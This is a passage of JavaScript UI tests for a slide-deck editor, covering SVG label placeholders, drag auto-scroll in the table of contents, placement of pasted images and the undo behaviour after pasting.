      for (const from of labels) {
        let done = 0;
        try {
          const before = new Set(texts().filter((el) => el.textContent.trim() === EDIT_PLACEHOLDER));
          commit(await open(svgText(from), from), ""); done++;
          const ph = await _waitFor(() => !_$("[data-testid='svg-text-edit']") && texts().find((el) => el.textContent.trim() === EDIT_PLACEHOLDER && !before.has(el)), 2000)
            .catch(() => { throw new Error(`"${from}": cleared label shows no placeholder`); });
          if (!_$("[data-vela-placeholder]", ph)) throw new Error(`"${from}": placeholder is not marked`);
          const r = ph.getBoundingClientRect();
          if (!(r.width > 4 && r.height > 4)) throw new Error(`"${from}": placeholder target is ${r.width}x${r.height}`);
          commit(await open(ph, `"${from}" placeholder`), "Back " + from); done++;
          await _waitFor(() => !_$("[data-testid='svg-text-edit']") && svgText("Back " + from), 2000).catch(() => { throw new Error(`"${from}": re-typed text not shown`); });
        } catch (e) { throw new Error(`${block.type}: ${e.message}`); }
        finally { document.activeElement?.blur?.(); for (let k = 0; k < done; k++) { _key("z", { ctrlKey: true }); await _wait(60); } }
        await _waitFor(() => svgText(from), 2000).catch(() => { throw new Error(`${block.type}: undo did not restore "${from}"`); });
      }
    }
  }},
  { name: "CR26: empty optional SVG labels show no placeholder in Present mode", fn: async () => {
    await _mrdInject([{ type: "cycle", items: [{ label: "PcA" }, { label: "PcB" }] }, { type: "funnel", items: [{ label: "PfA" }] }], null,
      (vp) => vp && _$$("text[data-svg-edit]", vp).some((el) => el.textContent.trim() === "PcA") ? vp : null);
    const n = _$$("[data-vela-placeholder]", _mrdViewport()).length;
    if (n < 4) throw new Error(`editor shows ${n} placeholders, want >= 4 (center label, sub, value, drop)`);
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    try {
      await _waitFor(() => !_$("header") && document.body.textContent.includes("PcA"), 2000);
      await _wait(150);
      const ph = _$$("[data-vela-placeholder]").length, ed = _$$("[data-svg-edit]").length;
      if (ph || ed) throw new Error(`Present mode shows ${ph} placeholders and ${ed} editable SVG labels`);
    } finally {
      _key("f");
      await _waitFor(() => _$("header"), 2000);
    }
  }},
  { name: "CR26: opening an SVG label input does not move or cover the other labels", fn: async () => {
    await _mrdInject([{ type: "funnel", items: [{ label: "LsA", value: "10K", drop: "-40%" }, { label: "LsB", value: "4K" }, { label: "LsC", value: "1K" }] }], null,
      (vp) => vp && _$$("text[data-svg-edit]", vp).some((el) => el.textContent.trim() === "LsA") ? vp : null);
    await _wait(1000); // let the entrance (stagger) animation settle before measuring
    const texts = () => _$$("text[data-svg-edit]", _mrdViewport());
    const others = () => texts().filter((el) => el.textContent.trim() !== "LsA");
    const r0 = others().map((el) => el.getBoundingClientRect());
    _clickMod(texts().find((el) => el.textContent.trim() === "LsA"));
    const inp = await _waitFor(() => _$("[data-testid='svg-text-edit']", _mrdViewport()), 1500);
    try {
      await _mrdFrame();
      const r1 = others().map((el) => el.getBoundingClientRect());
      r0.forEach((a, i) => {
        const b = r1[i];
        if (Math.abs(a.left - b.left) > 1 || Math.abs(a.top - b.top) > 1) throw new Error(`label ${i} moved ${b.left - a.left},${b.top - a.top}px`);
      });
      const ir = inp.getBoundingClientRect();
      const cover = r1.find((b) => ir.left < b.right - 1 && ir.right > b.left + 1 && ir.top < b.bottom - 1 && ir.bottom > b.top + 1);
      if (cover) throw new Error("input covers an adjacent label");
    } finally {
      inp.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true, cancelable: true }));
      await _waitFor(() => !_$("[data-testid='svg-text-edit']"), 1500);
    }
  }},
  { name: "CR26: typed status names ignore case, underscore and hyphen", fn: async () => {
    const hooks = _hooks();
    await _mrdInject([{ type: "checklist", items: [{ text: "St one", status: "pending" }, { text: "St two", status: "done" }] }], null,
      (vp) => vp?.textContent.includes("St one") ? vp : null);
    const past0 = hooks.getHistoryCounts ? hooks.getHistoryCounts().past : 0;
    try {
      await _tlEdit("PENDING", "in_progress", "IN PROGRESS");
      await _tlEdit("DONE", "In-Progress", "IN PROGRESS");
      // A save that normalizes to the current state shows the default label at once.
      await _tlEdit("IN PROGRESS", "in_progress", "IN PROGRESS");
      await _tlEdit("IN PROGRESS", "", "IN PROGRESS");
      const cols = _$$("div", _mrdViewport()).filter((el) => el.style.cursor === "pointer" && el.textContent.trim() === "IN PROGRESS").map((el) => el.style.color);
      if (cols.length !== 2 || !cols.every((c) => /245, 158, 11|#f59e0b/i.test(c))) throw new Error(`status not switched to in-progress (${cols})`);
    } finally {
      await _mrdUndoTo(past0);
    }
  }},
  { name: "CR26: empty-text placeholder is invisible until its block is hovered, and keeps its size", fn: async () => {
    await _mrdInject([{ type: "funnel", items: [{ label: "PhA", value: "10K" }, { label: "PhB", value: "4K" }] }], null,
      (vp) => vp && _$$("text[data-svg-edit]", vp).some((el) => el.textContent.trim() === "PhA") ? vp : null);
    await _wait(1000);
    document.activeElement?.blur(); await _wait(100);
    const vp = _mrdViewport();
    const ph = _$("[data-vela-placeholder]", vp);
    if (!ph) throw new Error("no placeholder found");
    const host = ph.closest("[data-block-type]");
    const op = () => parseFloat(getComputedStyle(ph).opacity);
    await _mrdUnhover(host);
    const r0 = ph.getBoundingClientRect();
    if (op() !== 0) throw new Error(`placeholder opacity ${op()} without hover, want 0`);
    await _mrdHover(host);
    if (!(op() > 0.2)) throw new Error(`placeholder opacity ${op()} on hover, want visible`);
    const r1 = ph.getBoundingClientRect();
    if (Math.abs(r0.width - r1.width) > 0.5 || Math.abs(r0.height - r1.height) > 0.5 || Math.abs(r0.left - r1.left) > 0.5) throw new Error("placeholder box changed on hover");
    if (!(r0.width > 4 && r0.height > 4)) throw new Error(`hidden placeholder target is ${r0.width}x${r0.height}`);
    await _mrdUnhover(host);
    if (op() !== 0) throw new Error("placeholder stays visible after hover ends");
  }},
  { name: "CR26: markup typed into an SVG label is stored like the same input in an HTML text", fn: async () => {
    const typed = "<b>hi</b> sub";
    // HTML path: the value EditableText stores for this input, as shown.
    await _mrdInject([{ type: "checklist", items: [{ text: "Task one", status: "pending" }] }], null,
      (vp) => vp?.textContent.includes("Task one") ? vp : null);
    let done = 0, want;
    try {
      _click(await _waitFor(() => _tlEditNode("Task one"), 2000));
      const ed = await _waitFor(() => _$("[contenteditable='true']", _mrdViewport()), 1500);
      ed.textContent = typed;
      ed.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, cancelable: true }));
      await _waitFor(() => !_$("[contenteditable='true']"), 2000); done++;
      want = _$$("div", _mrdViewport()).filter((el) => el.style.cursor === "pointer" && el.textContent.trim() !== "PENDING" && !_$$("div", el).some((c) => c.style.cursor === "pointer"))[0]?.textContent.trim();
    } finally { document.activeElement?.blur?.(); for (let k = 0; k < done; k++) { _key("z", { ctrlKey: true }); await _wait(60); } }
    if (!want || /[<>]/.test(want)) throw new Error(`HTML text kept markup: "${want}"`);
    // SVG path: funnel value, cycle centre label, flow loop label.
    const svgText = (t) => _$$("text[data-svg-edit]", _mrdViewport() || document).find((el) => el.textContent.trim() === t);
    const cases = [
      [{ type: "funnel", items: [{ label: "FunA", value: "100" }] }, "100"],
      [{ type: "cycle", centerLabel: "CtrL", items: [{ label: "CyA" }, { label: "CyB" }] }, "CtrL"],
      [{ type: "flow", loop: true, loopLabel: "LoopH", items: [{ label: "A" }, { label: "B" }] }, "LoopH"],
    ];
    for (const [block, from] of cases) {
      await _mrdInject([block], null, (vp) => vp && svgText(from) ? vp : null);
      let n = 0;
      try {
        _clickMod(svgText(from));
        const inp = await _waitFor(() => _$("[data-testid='svg-text-edit']", _mrdViewport()), 1500);
        inp.value = typed;
        inp.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, cancelable: true }));
        await _waitFor(() => !_$("[data-testid='svg-text-edit']") && svgText(want), 2000).catch(() => {
          throw new Error(`typed markup shows "${_$$("text[data-svg-edit]", _mrdViewport()).map((el) => el.textContent).join("|")}", want "${want}"`);
        }); n++;
      } catch (e) { throw new Error(`${block.type}: ${e.message}`); }
      finally { document.activeElement?.blur?.(); for (let k = 0; k < n; k++) { _key("z", { ctrlKey: true }); await _wait(60); } }
    }
  }},
  { name: "CR26: an empty flow loop label placeholder sits where the filled label sits", fn: async () => {
    const texts = () => _$$("text[data-svg-edit]", _mrdViewport() || document);
    const svgText = (t) => texts().find((el) => el.textContent.trim() === t);
    const cx = (el) => { const r = el.getBoundingClientRect(); return (r.left + r.right) / 2; };
    const cy = (el) => { const r = el.getBoundingClientRect(); return (r.top + r.bottom) / 2; };
    for (const [dir, lab] of [["horizontal", "LoopP"], ["vertical", "LoopQ"]]) {
      await _mrdInject([{ type: "flow", loop: true, direction: dir, loopLabel: lab, items: [{ label: "A" }, { label: "B" }, { label: "C" }] }], null,
        (vp) => vp && svgText(lab) ? vp : null);
      await _wait(900); // let the entrance animation settle before measuring
      let done = 0;
      try {
        const f = svgText(lab), fx = cx(f), fy = cy(f);
        _clickMod(f);
        const inp = await _waitFor(() => _$("[data-testid='svg-text-edit']", _mrdViewport()), 1500);
        inp.value = "";
        inp.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, cancelable: true })); done++;
        const ph = await _waitFor(() => !_$("[data-testid='svg-text-edit']") && texts().find((el) => el.textContent.trim() === EDIT_PLACEHOLDER), 2000);
        await _wait(200);
        const px = cx(ph), py = cy(ph);
        if (Math.abs(px - fx) > 4 || Math.abs(py - fy) > 4) throw new Error(`placeholder at ${px.toFixed(1)},${py.toFixed(1)}, label at ${fx.toFixed(1)},${fy.toFixed(1)}`);
      } catch (e) { throw new Error(`${dir}: ${e.message}`); }
      finally { document.activeElement?.blur?.(); for (let k = 0; k < done; k++) { _key("z", { ctrlKey: true }); await _wait(60); } }
    }
  }},
], { setup: _selectFirstModule });

// CR21: while a slide or section is dragged in the TOC, the pointer near the top /
// bottom edge of the scroll pane scrolls it, so a drop can reach the first / last
// section. The pane is made short here so it overflows with any deck.
async function _tidelineTocDrag(fn) {
  const tree = await _waitFor(() => document.querySelector('[data-testid="toc-tree"]'), 3000);
  const pane = tree.parentElement; const old = pane.style.maxHeight;
  pane.style.maxHeight = Math.max(90, Math.min(220, Math.floor(tree.offsetHeight / 2))) + "px";
  try {
    await _wait(60);
    const sc = tocScrollParent(tree);
    if (sc !== pane) throw new Error("TOC pane does not overflow");
    return await fn(sc, tree);
  } finally { pane.style.maxHeight = old; }
}
function _tidelineFire(dt) { return (el, type, extra) => el.dispatchEvent(new DragEvent(type, Object.assign({ bubbles: true, cancelable: true, dataTransfer: dt }, extra))); }
// Fire dragover at (x, y) every 40ms until cond() or timeout; return cond().
async function _tidelineHold(el, fire, x, y, cond, ms) {
  const t0 = performance.now();
  while (performance.now() - t0 < ms) { fire(el, "dragover", { clientX: x, clientY: y }); await _wait(40); if (cond()) return true; }
  return cond();
}
const _tidelineRows = () => _$$('[data-testid="toc-slide-row"]');
// The title span has flex:1 (the number / time spans before it change on a move).
const _tidelineTitle = (r) => { const t = _$$("span", r).find((x) => x.style.flex && x.style.flex.startsWith("1")); return ((t || r).textContent || "").trim(); };

uiSuite("tideline-CR21 TOC drag auto-scroll", [
  { name: "Speed is 0 in the middle, grows toward each edge, and is 0 far outside", fn: async () => {
    const v = (y) => tocAutoScrollSpeed(y, 100, 500);
    if (v(300) !== 0) throw new Error("middle scrolls: " + v(300));
    if (!(v(150) < 0 && v(110) < v(150) && v(101) <= v(110))) throw new Error("top zone speed: " + [v(150), v(110), v(101)]);
    if (!(v(450) > 0 && v(490) > v(450) && v(499) >= v(490))) throw new Error("bottom zone speed: " + [v(450), v(490), v(499)]);
    if (v(90) !== -TOC_AUTOSCROLL_MAX || v(510) !== TOC_AUTOSCROLL_MAX) throw new Error("just outside is not full speed");
    if (v(0) !== 0 || v(700) !== 0 || tocAutoScrollSpeed(NaN, 0, 10) !== 0 || tocAutoScrollSpeed(5, 10, 10) !== 0) throw new Error("far outside / bad input scrolls");
  }},
  { name: "Drag near the top scrolls up to the start; drop lands in the first section", fn: () => _tidelineTocDrag(async (sc) => {
    sc.scrollTop = sc.scrollHeight; await _wait(60);
    const before = _tidelineRows().map(_tidelineTitle);
    if (before.length < 3) throw new Error("need >=3 slide rows");
    const src = _tidelineRows()[before.length - 1];
    const r = sc.getBoundingClientRect(); const x = r.left + r.width / 2;
    const fire = _tidelineFire(new DataTransfer());
    fire(src, "dragstart");
    try {
      if (!(await _tidelineHold(sc, fire, x, r.top + 3, () => sc.scrollTop === 0, 6000))) throw new Error("did not reach the top: " + sc.scrollTop);
      const dst = _tidelineRows()[0]; const b = dst.getBoundingClientRect();
      if (b.bottom < r.top || b.top > r.bottom) throw new Error("first row not visible after scroll");
      fire(dst, "dragover", { clientX: b.left + 5, clientY: b.top + 2 });
      fire(dst, "drop", { clientX: b.left + 5, clientY: b.top + 2 });
    } finally { fire(src, "dragend"); }
    await _waitFor(() => _tidelineTitle(_tidelineRows()[0]) === before[before.length - 1], 2000).catch(() => { throw new Error("drop did not land first: " + _tidelineRows().slice(0, 2).map(_tidelineTitle) + " | want " + before[before.length - 1]); });
    // Restore: drag it back below the row that is now last.
    const f2 = _tidelineFire(new DataTransfer()); const s2 = _tidelineRows()[0]; const rows = _tidelineRows(); const d2 = rows[rows.length - 1];
    d2.scrollIntoView({ block: "nearest" }); await _wait(40);
    const b2 = d2.getBoundingClientRect();
    f2(s2, "dragstart"); f2(d2, "dragover", { clientX: b2.left + 5, clientY: b2.bottom - 2 }); f2(d2, "drop", { clientX: b2.left + 5, clientY: b2.bottom - 2 }); f2(s2, "dragend");
    await _waitFor(() => JSON.stringify(_tidelineRows().map(_tidelineTitle)) === JSON.stringify(before), 2000).catch(() => { throw new Error("restore failed: " + _tidelineRows().map(_tidelineTitle).slice(-3)); });
  })},
  { name: "Drag near the bottom scrolls down to the end and stops there", fn: () => _tidelineTocDrag(async (sc) => {
    sc.scrollTop = 0; await _wait(60);
    const src = _tidelineRows()[0]; const r = sc.getBoundingClientRect(); const x = r.left + r.width / 2;
    const end = () => sc.scrollTop >= sc.scrollHeight - sc.clientHeight - 1;
    const fire = _tidelineFire(new DataTransfer());
    fire(src, "dragstart");
    try {
      if (!(await _tidelineHold(sc, fire, x, r.bottom - 3, end, 6000))) throw new Error("did not reach the end: " + sc.scrollTop);
      const at = sc.scrollTop; await _wait(120);
      if (sc.scrollTop !== at) throw new Error("scrolled past the end");
    } finally { fire(src, "dragend"); }
  })},
  { name: "Scroll stops on dragend (Escape), on drop, in the middle and without a drag", fn: () => _tidelineTocDrag(async (sc) => {
    const r = sc.getBoundingClientRect(); const x = r.left + r.width / 2;
    const mid = Math.floor((sc.scrollHeight - sc.clientHeight) / 2);
    const still = async () => { const a = sc.scrollTop; await _wait(150); return sc.scrollTop === a; };
    // No drag active: an edge dragover does nothing.
    sc.scrollTop = mid; await _wait(40);
    const fire0 = _tidelineFire(new DataTransfer());
    fire0(sc, "dragover", { clientX: x, clientY: r.bottom - 3 });
    if (!(await still()) || sc.scrollTop !== mid) throw new Error("scrolled without a drag");
    const src = _tidelineRows()[0];
    for (const endType of ["dragend", "drop"]) {
      sc.scrollTop = mid; await _wait(40);
      const fire = _tidelineFire(new DataTransfer());
      fire(src, "dragstart");
      try {
        fire(sc, "dragover", { clientX: x, clientY: r.bottom - 3 });
        await _wait(80);
        if (sc.scrollTop === mid) throw new Error("edge did not scroll");
        fire(endType === "drop" ? document.body : src, endType);
        if (!(await still())) throw new Error("still scrolls after " + endType);
        // Pointer back in the middle: no scroll.
        if (endType === "dragend") {
          fire(src, "dragstart"); sc.scrollTop = mid; await _wait(40);
          fire(sc, "dragover", { clientX: x, clientY: r.top + r.height / 2 });
          if (!(await still()) || sc.scrollTop !== mid) throw new Error("middle scrolls");
        }
      } finally { fire(src, "dragend"); }
    }
  })},
]);

// ── Sprint tideline (CR22-CR25): image paste placement stress test ──────
// Pastes 1-4 images of mixed aspect (wide 3:1, 16:9, square, tall 9:16) through
// the real paste handler onto (a) an empty slide, (b) a heading slide and (c) a
// heading + text + credit slide, then measures the rendered boxes.
const _tlAspects = { wide: [900, 300, "#3b82f6"], hd: [1280, 720, "#10b981"], sq: [600, 600, "#f59e0b"], tall: [450, 800, "#ef4444"] };
const _tlBases = {
  a: [],
  b: [{ type: "heading", text: "TL heading only" }],
  c: [{ type: "heading", text: "TL heading text credit" }, { type: "text", text: "Short body text that explains the pictures." }, { type: "text", text: "Credit: Example Author, 16 Jun 2025", size: "sm" }],
};
const _tlPaste = async (kind) => {
  const [w, h, color] = _tlAspects[kind];
  const cv = document.createElement("canvas"); cv.width = w; cv.height = h;
  const g = cv.getContext("2d"); g.fillStyle = color; g.fillRect(0, 0, w, h);
  const blob = await new Promise((r) => cv.toBlob(r, "image/png"));
  const dt = new DataTransfer(); dt.items.add(new File([blob], `${kind}.png`, { type: "image/png" }));
  _mrdViewport().dispatchEvent(new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }));
};
const _tlMeasure = () => {
  const vp = _mrdViewport(); const v = vp.getBoundingClientRect(); const s = v.width / 960;
  const outside = Array.from(vp.querySelectorAll("[data-block-type]")).filter((el) => el.dataset.blockType !== "image").map((el) => el.getBoundingClientRect())
    .filter((r) => r.left < v.left - 1 || r.top < v.top - 1 || r.right > v.right + 1 || r.bottom > v.bottom + 1);
  const imgs = Array.from(vp.querySelectorAll("img")).map((im) => {
    const r = im.getBoundingClientRect(); const k = Math.min(r.width / im.naturalWidth, r.height / im.naturalHeight);
    return { w: im.naturalWidth * k / s, h: im.naturalHeight * k / s, cx: (r.left + r.width / 2 - v.left) / s };
  });
  const grid = vp.querySelector("[data-testid='image-grid']");
  return { outside: outside.length, imgs, area: imgs.reduce((a, i) => a + i.w * i.h, 0) / (960 * 540), cols: grid ? Number(grid.getAttribute("data-image-cols")) : null };
};
const _tlCase = async (base, kinds, extra, probe) => {
  const past = _hooks().getHistoryCounts ? _hooks().getHistoryCounts().past : 0;
  await _mrdInject(_tlBases[base], { layout: undefined, contentFlex: undefined, imageFlex: undefined, imageCols: undefined, ...(extra || {}) }, (vp) => vp);
  for (let k = 0; k < kinds.length; k++) {
    await _tlPaste(kinds[k]);
    await _waitFor(() => Array.from(_mrdViewport().querySelectorAll("img")).filter((im) => im.complete && im.naturalWidth > 0).length >= k + 1, 4000);
  }
  // Let the fit pass, the aspect cache and the grid box settle.
  await _wait(500); await _mrdFrame();
  const m = _tlMeasure();
  const label = `${base}:${kinds.join("+")}`;
  if (m.outside) throw new Error(`${label}: ${m.outside} non-image block(s) outside the 960x540 canvas`);
  if (m.imgs.length !== kinds.length) throw new Error(`${label}: ${m.imgs.length}/${kinds.length} images rendered`);
  if (m.imgs.some((i) => !(i.h > 20 && i.w > 20))) throw new Error(`${label}: an image is collapsed (${m.imgs.map((i) => `${i.w.toFixed(0)}x${i.h.toFixed(0)}`).join(" ")})`);
  if (probe) m.probe = await probe(m, label);
  await _mrdUndoTo(past);
  return m;
};

uiSuite("tideline-CR22-CR25 image placement", [
  { name: "CR22: one image on an empty slide that kept a split layout fills the slide, not one half", fn: async () => {
    for (const layout of ["image-right", "image-left"]) {
      const m = await _tlCase("a", ["tall"], { layout });
      const cx = m.imgs[0].cx;
      if (Math.abs(cx - 480) > 24) throw new Error(`${layout}: image centre x=${cx.toFixed(0)} (expected near 480)`);
      if (m.imgs[0].h < 500) throw new Error(`${layout}: tall image height ${m.imgs[0].h.toFixed(0)} does not fill the slide`);
    }
  }},
  { name: "CR24: a wide image fills the free width (solo and under a heading)", fn: async () => {
    for (const base of ["a", "b", "c"]) {
      const m = await _tlCase(base, ["wide"]);
      if (m.imgs[0].w < 800) throw new Error(`${base}: wide image is only ${m.imgs[0].w.toFixed(0)}px wide`);
    }
  }},
  { name: "CR22/CR24: single images of every aspect use the free area well", fn: async () => {
    const minArea = { a: 0.3, b: 0.18, c: 0.15 };
    for (const base of ["a", "b", "c"]) for (const kind of ["wide", "hd", "sq", "tall"]) {
      const m = await _tlCase(base, [kind]);
      if (m.area < minArea[base]) throw new Error(`${base}:${kind}: image covers ${(m.area * 100).toFixed(0)}% of the slide`);
    }
  }},
  { name: "CR23: three images pick their grid by aspect ratio", fn: async () => {
    for (const base of ["a", "b"]) {
      const tall = await _tlCase(base, ["tall", "tall", "tall"]);
      if (tall.cols !== 3) throw new Error(`${base}: 3 tall images use ${tall.cols} columns (expected one row of 3)`);
      const wide = await _tlCase(base, ["wide", "wide", "wide"]);
      if (!(wide.cols < 3)) throw new Error(`${base}: 3 wide images still use ${wide.cols} columns`);
    }
    const c = await _tlCase("c", ["wide", "wide", "wide"]);
    if (!(c.cols < 3)) throw new Error(`c: 3 wide images still use ${c.cols} columns`);
  }},
  { name: "CR25: 2-4 mixed images never push text off the slide", fn: async () => {
    for (const base of ["a", "b", "c"]) for (const kinds of [["wide", "tall"], ["hd", "hd"], ["wide", "sq", "tall"], ["wide", "hd", "sq", "tall"]]) {
      await _tlCase(base, kinds);
    }
  }},
  { name: "CR25: a tall image between a heading and a credit line yields its height", fn: async () => {
    const marker = "TL CR25 credit";
    const src = _mrdSvg(338, 600, "ef4444");
    for (const body of [[], [{ type: "text", text: "A long paragraph of body text. ".repeat(14) }]]) {
      await _mrdInject([{ type: "heading", text: "TL CR25" }, ...body, { type: "image", src }, { type: "text", text: marker }], { layout: undefined }, (vp) => vp?.textContent.includes(marker) && vp.querySelector("img")?.naturalWidth > 0 ? vp : null);
      await _wait(400);
      const m = _tlMeasure();
      if (m.outside) throw new Error(`${body.length ? "heavy" : "plain"}: ${m.outside} text block(s) outside the canvas`);
      const credit = Array.from(_mrdViewport().querySelectorAll("[data-block-type='text']")).find((el) => el.textContent.includes(marker));
      const vr = _mrdViewport().getBoundingClientRect(), cr = credit.getBoundingClientRect();
      if (cr.bottom > vr.bottom - 4) throw new Error(`credit line is clipped (bottom ${(cr.bottom - vr.bottom).toFixed(1)}px past the slide)`);
      if (m.imgs[0].h < 100) throw new Error(`image collapsed to ${m.imgs[0].h.toFixed(0)}px`);
    }
  }},
  { name: "CR24/CR25: small icons and logos are never upscaled past 2x natural size", fn: async () => {
    const png = (w, h, color) => { const cv = document.createElement("canvas"); cv.width = w; cv.height = h; const g = cv.getContext("2d"); g.fillStyle = color; g.fillRect(0, 0, w, h); return cv.toDataURL("image/png"); };
    const icon = png(32, 32, "#3b82f6"), logo = png(64, 64, "#f59e0b"), hd = png(1280, 720, "#10b981"), wide = png(900, 300, "#ef4444");
    const cases = [
      ["icon alone", [{ type: "image", src: icon }], [32]],
      ["icon under a heading", [{ type: "heading", text: "TL icon" }, { type: "image", src: icon }], [32]],
      ["logo in a 3-image grid", [{ type: "heading", text: "TL logo" }, { type: "image", src: logo }, { type: "image", src: hd }, { type: "image", src: wide }], [64, 1280, 900]],
    ];
    for (const [label, blocks, naturals] of cases) {
      const past = _hooks().getHistoryCounts ? _hooks().getHistoryCounts().past : 0;
      await _mrdInject(blocks, { layout: undefined, imageCols: undefined }, (vp) => { const ims = Array.from(vp?.querySelectorAll("img") || []); return ims.length === naturals.length && ims.every((im) => im.complete && im.naturalWidth > 0) ? vp : null; });
      await _wait(300); await _mrdFrame();
      const m = _tlMeasure();
      if (m.outside) throw new Error(`${label}: ${m.outside} block(s) outside the canvas`);
      m.imgs.forEach((im, k) => { if (im.w > naturals[k] * 2 + 1) throw new Error(`${label}: image ${k} shown ${im.w.toFixed(0)}px wide (natural ${naturals[k]})`); });
      if (label === "icon alone" && Math.abs(m.imgs[0].cx - 480) > 4) throw new Error(`icon alone is not centered (cx ${m.imgs[0].cx.toFixed(0)})`);
      await _mrdUndoTo(past);
    }
  }},
  { name: "CR23: sequential pastes pick the layout with the larger image area", fn: async () => {
    // After each paste, render the same images in the other layout (split <->
    // stacked) and measure it. The chosen layout must show at least as much
    // image area (3% measurement tolerance) and keep all text on the slide.
    const alt = async (m, label) => {
      const vp = _mrdViewport();
      const split = !!vp.querySelector("[data-split-image]");
      const srcs = Array.from(vp.querySelectorAll("img")).map((im) => im.getAttribute("src"));
      const n = srcs.length, last = m.imgs[n - 1];
      const [cf, imf] = pasteSplitFlex(n, last.w / last.h);
      await _mrdInject([..._tlBases.c, ...srcs.map((src) => ({ type: "image", src }))], split ? { layout: undefined, contentFlex: undefined, imageFlex: undefined, imageCols: undefined } : { layout: "image-right", contentFlex: cf, imageFlex: imf, imageCols: undefined },
        (v) => (!!v?.querySelector("[data-split-image]")) !== split && Array.from(v.querySelectorAll("img")).filter((im) => im.complete && im.naturalWidth > 0).length === n ? v : null);
      await _wait(400); await _mrdFrame();
      const a = _tlMeasure();
      if (m.area < a.area * 0.97) throw new Error(`${label}: ${split ? "split" : "stack"} shows ${(m.area * 100).toFixed(1)}% but ${split ? "stack" : "split"} would show ${(a.area * 100).toFixed(1)}%`);
      return split;
    };
    for (const [kind, max] of [["sq", 4], ["wide", 3], ["tall", 3]]) for (let n = 1; n <= max; n++) await _tlCase("c", Array(n).fill(kind), undefined, alt);
    // The reported case: 3 squares on heading+text+credit must not stay in a split.
    const three = await _tlCase("c", ["sq", "sq", "sq"], undefined, async () => !!_mrdViewport().querySelector("[data-split-image]"));
    if (three.probe) throw new Error("3 squares stayed in a side split");
  }},
  { name: "CR23: a split the author set stays a split on later pastes", fn: async () => {
    const m = await _tlCase("c", ["sq", "sq", "sq"], { layout: "image-left" }, async () => !!_mrdViewport().querySelector("[data-split-image]"));
    if (!m.probe) throw new Error("author image-left split was replaced");
  }},
  { name: "CR24: a large 1600x900 image alone still fills the slide width", fn: async () => {
    const cv = document.createElement("canvas"); cv.width = 1600; cv.height = 900; cv.getContext("2d").fillRect(0, 0, 1600, 900);
    const past = _hooks().getHistoryCounts ? _hooks().getHistoryCounts().past : 0;
    await _mrdInject([{ type: "image", src: cv.toDataURL("image/png") }], { layout: undefined }, (vp) => vp?.querySelector("img")?.naturalWidth > 0 ? vp : null);
    await _wait(300); await _mrdFrame();
    const m = _tlMeasure();
    await _mrdUndoTo(past);
    if (m.imgs[0].w < 960 * 0.9) throw new Error(`1600x900 image is only ${m.imgs[0].w.toFixed(0)}px wide`);
  }},
  { name: "paste burst: 3 and 5 rapid image pastes (0/50/150 ms apart) all land in order, one undo step each", fn: async () => {
    const counts = () => _hooks().getHistoryCounts().past;
    for (const n of [3, 5]) for (const gap of [0, 50, 150]) {
      const label = `${n} pastes ${gap}ms apart`, mark = `TL-BURST-${n}-${gap}`;
      const past = counts();
      await _mrdInject([{ type: "heading", text: mark }], { layout: undefined, contentFlex: undefined, imageFlex: undefined, imageCols: undefined }, (vp) => vp?.textContent.includes(mark) && !vp.querySelector("img") ? vp : null);
      const rows = _m1RowTitles().length;
      // Distinct widths (natural size is kept) mark the paste order.
      const widths = Array.from({ length: n }, (_, k) => 120 + 60 * k);
      const blobs = await Promise.all(widths.map((w, k) => { const cv = document.createElement("canvas"); cv.width = w; cv.height = 90; const g = cv.getContext("2d"); g.fillStyle = _tlColors[k % 5]; g.fillRect(0, 0, w, 90); return new Promise((r) => cv.toBlob(r, "image/png")); }));
      for (let k = 0; k < n; k++) {
        const dt = new DataTransfer(); dt.items.add(new File([blobs[k]], `b${k}.png`, { type: "image/png" }));
        _mrdViewport().dispatchEvent(new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }));
        if (gap) await _wait(gap);
      }
      let got = [];
      try { await _waitFor(() => { const vp = _mrdViewport(); got = Array.from(vp?.querySelectorAll("img") || []).filter((im) => im.complete && im.naturalWidth > 0).map((im) => im.naturalWidth); return got.length >= n && vp.textContent.includes(mark) ? vp : null; }, 8000); } catch { /* reported below */ }
      await _wait(200);
      const rowsAfter = _m1RowTitles().length;
      // One undo step per paste: each Ctrl+Z removes exactly the last image.
      // (Counted from the rendered slide: the history counter stops at its cap
      // in a long battery run.)
      let undoErr = null;
      if (got.length === n) {
        document.activeElement?.blur?.();
        for (let k = n - 1; k >= 0 && !undoErr; k--) {
          _key("z", { ctrlKey: true });
          const left = await _waitFor(() => { const w = Array.from(_mrdViewport()?.querySelectorAll("img") || []).map((im) => im.naturalWidth); return w.length === k ? w : null; }, 1500).catch(() => null);
          if (!left) undoErr = `undo ${n - k} did not remove exactly one image`;
          else if (left.join(",") !== widths.slice(0, k).join(",")) undoErr = `undo ${n - k} left ${left.join(",")}`;
        }
      }
      await _mrdUndoTo(past);
      if (got.length !== n) throw new Error(`${label}: ${got.length}/${n} images on the target slide`);
      if (got.join(",") !== widths.join(",")) throw new Error(`${label}: images out of paste order (${got.join(",")})`);
      if (undoErr) throw new Error(`${label}: ${undoErr}`);
      if (rowsAfter !== rows) throw new Error(`${label}: slide count changed ${rows} -> ${rowsAfter}`);
    }
  }},
  { name: "CR23 stress matrix: the pasted layout and grid show >= 85% of the best alternative (5 gate repros + 12 seeded cases; the unit matrix has all 66)", fn: async () => {
    // The last image goes through the real paste handler; the chosen result is
    // then compared, by real rendering, with the other layout (split <-> stack)
    // and with the uniform count-driven grid in the same layout.
    const fixed = [{ body: "table", aspects: [16 / 9] }, { body: "table", aspects: [16 / 9, 16 / 9] }, { body: "bullets8", aspects: [16 / 9, 16 / 9, 16 / 9, 16 / 9] }, { body: "none", aspects: [1 / 3, 16 / 9] }, { body: "none", aspects: [1 / 3, 16 / 9, 1 / 3] }];
    const cases = [...fixed, ...tidelineStressCases().filter((_, k) => k % 5 === 2).slice(0, 12)];
    let min = Infinity, worst = "";
    for (const c of cases) {
      const r = await _tlStressCase(c);
      if (r.ratio < min) { min = r.ratio; worst = r.label; }
      if (r.ratio < 0.85) throw new Error(`${r.label}: chosen ${r.detail}`);
    }
    return { cases: cases.length, min: Number(min.toFixed(3)), worst };
  }},
  { name: "paste race: deleting the slide while an image paste is pending drops the paste", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
